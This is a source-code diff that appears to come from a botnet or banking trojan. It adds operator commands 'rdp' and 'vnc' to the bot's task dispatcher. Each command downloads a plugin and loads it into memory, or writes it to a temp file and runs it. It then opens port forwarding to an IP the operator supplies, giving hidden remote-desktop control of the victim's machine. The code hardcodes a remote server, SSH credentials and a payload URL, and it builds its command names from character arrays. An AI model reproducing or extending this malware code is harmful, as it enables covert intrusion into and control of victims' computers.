@@ -871,7 +871,10 @@ bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
-static DWORD WINAPI ProcessRunRDP(void*)
+
+static char ipServerForRDP[16];
+
+static DWORD WINAPI ProcessRDP(void*)
 {
 	typedef int (WINAPIV* PINIT) (char* config);
 	typedef int (WINAPIV* PSTART)();
@@ -879,69 +882,118 @@ static DWORD WINAPI ProcessRunRDP(void*)
 	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);
 
 	BOT::Initialize();
-	TASKDBG( "Task", "Run RDP" );
+	char ipServer[16];
+	m_lstrcpy( ipServer, ipServerForRDP );
+	TASKDBG( "Task", "Run RDP, ip %s", ipServer );
 	DWORD c_data;
-	BYTE* data = File::ReadToBufferA( "c:\\rdp.dll", c_data );
+	BYTE* data = Plugin::Download( "rdp.plug", 0, &c_data, false );
+	//BYTE* data = File::ReadToBufferA( "c:\\rdp.dll", c_data );
 	if( data )
 	{
-		HMEMORYMODULE module = MemoryLoadLibrary(data);
-		if( module )
+		if( RunPortForward(ipServer) )
 		{
-			PINIT Init = (PINIT)MemoryGetProcAddress( module, "Init" );
-			PSTART Start = (PSTART)MemoryGetProcAddress( module, "Start" );
-			PSTOP Stop = (PSTOP)MemoryGetProcAddress( module, "Stop" );
-			PTakeBotGuid TakeBotGuid = (PTakeBotGuid)MemoryGetProcAddress( module, "TakeBotGuid" );
-			if( Init )
+			HMEMORYMODULE module = MemoryLoadLibrary(data);
+			if( module )
 			{
-				TASKDBG( "Task", "Init RDP" );
-				Init("88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73");
-				Start();
-				for(;;) // ждем команды на выключение
+				PINIT Init = (PINIT)MemoryGetProcAddress( module, "Init" );
+				PSTART Start = (PSTART)MemoryGetProcAddress( module, "Start" );
+				PSTOP Stop = (PSTOP)MemoryGetProcAddress( module, "Stop" );
+				PTakeBotGuid TakeBotGuid = (PTakeBotGuid)MemoryGetProcAddress( module, "TakeBotGuid" );
+				if( Init )
 				{
-					HANDLE tmp;
-					tmp = (HANDLE)pOpenMutexA( MUTEX_ALL_ACCESS, false, "DllStop" );
-					if ((DWORD)pWaitForSingleObject( tmp, INFINITE ))
-						pSleep(100);
-					else
-						break;
+					TASKDBG( "Task", "Init RDP" );
+					Init("88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73");
+					Start();
+					for(;;) // ждем команды на выключение
+					{
+						HANDLE tmp;
+						tmp = (HANDLE)pOpenMutexA( MUTEX_ALL_ACCESS, false, "DllStop" );
+						if ((DWORD)pWaitForSingleObject( tmp, INFINITE ))
+							pSleep(100);
+						else
+							break;
+					}
+					Stop();
+					TASKDBG( "Task", "Stop RDP" );
+					MemoryFreeLibrary(module);
 				}
-				Stop();
-				TASKDBG( "Task", "Stop RDP" );
-				MemoryFreeLibrary(module);
 			}
+			MemFree(data);
 		}
 	}
 	return 0;
 }
 
-bool ExecuteRunRDP(PTaskManager, PCHAR Command, PCHAR Args)
+bool ExecuteRDP(PTaskManager, PCHAR Command, PCHAR Args)
 {
-	MegaJump(ProcessRunRDP);
-	return true;
+	int len = m_lstrlen(Args);
+	if( len < sizeof(ipServerForRDP) && len > 0 )
+	{
+		//пишем IP адрес в глобальную переменную, которая будет содержать это значение даже после копирования
+		//бота в другой процесс, т. е. таким образом передаем параметр для нового процесса
+		m_memcpy( ipServerForRDP, Args, len + 1 );
+		MegaJump(ProcessRDP);
+		return true;
+	}
+	return false;
 }
 
-static DWORD WINAPI ProcessRunHVNC(void*)
+static char ipServerForVNC[16];
+
+static DWORD WINAPI ProcessVNC(void*)
 {
 	BOT::Initialize();
-	TASKDBG( "Task", "Run HVNC" );
+
+	char ipServer[16];
+	m_lstrcpy( ipServer, ipServerForVNC );
+	TASKDBG( "Task", "Run VNC, ip %s", ipServer );
 	DWORD c_data;
-	BYTE* data = File::ReadToBufferA( "c:\\hvnc.exe", c_data );
+	BYTE* data = Plugin::Download( "vnc.plug", 0, &c_data, false );
+//	BYTE* data = File::ReadToBufferA( "c:\\hvnc.exe", c_data );
 	if( data )
 	{
-		HMEMORYMODULE module = MemoryLoadLibrary(data);
-		if( module )
+		char fileName[MAX_PATH];
+		File::GetTempName(fileName);
+		if( File::WriteBufferA( fileName, data, c_data ) == c_data )
 		{
-			TASKDBG( "Task", "Exit HVNC" );
-			MemoryFreeLibrary(module);
+			TASKDBG( "Task", "vnc.plug saved in %s", fileName );
+			if( RunFileA(fileName) )
+			{
+				pMoveFileExA( fileName, 0, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+				if( RunPortForward(ipServer) )
+				{
+					TASKDBG( "Task", "VNC worked" );
+					pSleep(24 * 3600 * 1000);
+				}
+			}
+			else
+				pDeleteFileA(fileName);
 		}
+		MemFree(data);
 	}
+				/*
+				HMEMORYMODULE module = MemoryLoadLibrary(data);
+				if( module )
+				{
+					TASKDBG( "Task", "Exit HVNC" );
+					MemoryFreeLibrary(module);
+				}
+				*/
 	return 0;
 }
 
-bool ExecuteRunHVNC(PTaskManager, PCHAR Command, PCHAR Args)
+bool ExecuteVNC(PTaskManager, PCHAR Command, PCHAR Args)
 {
-	MegaJump(ProcessRunHVNC);
-	return true;
+	int len = m_lstrlen(Args);
+	if( len < sizeof(ipServerForVNC) && len > 0 )
+	{
+		//пишем IP адрес в глобальную переменную, которая будет содержать это значение даже после копирования
+		//бота в другой процесс, т. е. таким образом передаем параметр для нового процесса
+		m_memcpy( ipServerForVNC, Args, len + 1 );
+		MegaJump(ProcessVNC);
+		return true;
+	}
+	return false;
 }
 
 bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
@@ -1113,8 +1165,10 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandUpdateHosts[]   = {'u', 'p', 'd', 'a', 't', 'e', 'h', 'o', 's', 't', 's',  0};
 	const static char CommandLoadDLLDisk[]	 = {'l','o','a','d','d','l','l','d','i','s','k', 0};
 	const static char CommandDocFind[]		 = {'d','o','c','f','i','n','d', 0};
+	const static char CommandRDP[]			 = {'r','d','p', 0};
+	const static char CommandVNC[]			 = {'v','n','c', 0};
 
-	int Index = StrIndexOf( Command, false, 8,
+	int Index = StrIndexOf( Command, false, 10,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
@@ -1122,7 +1176,9 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 							(PCHAR)CommandAlert,
 							(PCHAR)CommandUpdateHosts,
 							(PCHAR)CommandLoadDLLDisk,
-							(PCHAR)CommandDocFind
+							(PCHAR)CommandDocFind,
+							(PCHAR)CommandRDP,
+							(PCHAR)CommandVNC
 						  );
 
 
@@ -1136,6 +1192,8 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 5: return Hosts::ExecuteUpdateHostsCommand;
 		case 6: return ExecuteLoadDLLDisk;
 		case 7: return ExecuteDocFind;
+		case 8: return ExecuteRDP;
+		case 9: return ExecuteVNC;
 
     default: ;
 	}
